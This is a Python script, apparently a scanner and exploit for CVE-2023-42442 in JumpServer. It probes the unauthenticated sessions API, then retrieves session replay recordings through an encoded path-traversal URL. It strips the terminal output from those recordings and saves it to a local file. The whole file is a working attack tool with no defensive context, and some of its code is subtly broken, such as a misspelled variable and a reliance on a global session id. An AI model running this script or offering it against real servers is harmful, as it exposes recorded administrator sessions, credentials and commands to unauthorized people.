# -*- coding: utf-8 -*-
# @Author  : TongMystic
# @Time    : 9/27/2023 7:04 PM
# @Function:
import json
import re
import sys
from urllib.parse import urljoin, quote
import requests

def escape_ansi(line):
    ansi_escape =re.compile(r'(\x9B|\x1B\[)[0-?]*[ -\/]*[@-~]')
    return ansi_escape.sub('', line)

def cve_2023_42442(domain):
    try:
        re = requests.get(urljoin(domain,"/core/auth/login/"))
        if re.status_code == 200 and re.text.find("jumpserver") != -1:
            req = requests.get(urljoin(domain, "/api/v1/terminal/sessions/"))
            if req.status_code == 200:
                if req.text.find("\"id\":") != -1 or req.text.find("[]") != -1:
                    return True
            else:
                return False
    except:
        return False

def getJumpserverReplay(domain,id,time):
    redoamin = "http://"+domain+"/"
    if cve_2023_42442("http://"+domain) :
        redomain = "http://"+domain+"/"
    elif cve_2023_42442("https://"+domain):
        redomain = "https://" + domain+"/"
    # 原始路径，包括`/../`
    raw_path = "media/xpack/../replay/" + time + "/" + id + ".cast.gz"

    # 对路径进行手动编码
    encoded_path = quote(raw_path, safe="")

    # 构建完整的URL
    url = f"{redomain}{encoded_path}"
    rereplay = requests.get(url)
    if rereplay.status_code == 200:
        # 初始化一个空字符串，用于存储提取的字符串
        result = ""
        lines = rereplay.text

        # 遍历每一行数据
        for line in rereplay.iter_lines():
            try:
                # 将每行数据解析为Python列表
                data = json.loads(line)
                if isinstance(data, list) and len(data) >= 2 and data[1] == "o":
                    extracted_str = data[2]
                    clean_data = escape_ansi(extracted_str)
                    result += clean_data
            except json.JSONDecodeError:
                # 如果解析失败，跳过该行
                pass

        with open(sessionId+'.txt', 'w', encoding='utf-8') as file:
            file.write(result)
        print("replay save in file : "+sessionId+".txt")






if __name__ == '__main__':
    if len(sys.argv) == 2:
        domain = sys.argv[1]
        if cve_2023_42442("http://" + domain):
            print("!!!Find CVE-2023-42442 On " + domain)
        elif cve_2023_42442("https://" + domain):
            print("!!!Find CVE-2023-42442 On " + domain)
        else:
            print("NOT Find CVE-2023-42442 On " + domain)
    elif len(sys.argv) == 4:
        domain = sys.argv[1]
        sessionTime = sys.argv[3]
        sessionId = sys.argv[2]
        getJumpserverReplay(domain,sessionId,sessionTime)
    else:
        print("""Help:
                python .\CVE-2023-42442.py <JumpServer_Domain> 
                python .\CVE-2023-42442.py <JumpServer_Domain> <Session_Id> <Session_Time>""")
        sys.exit()

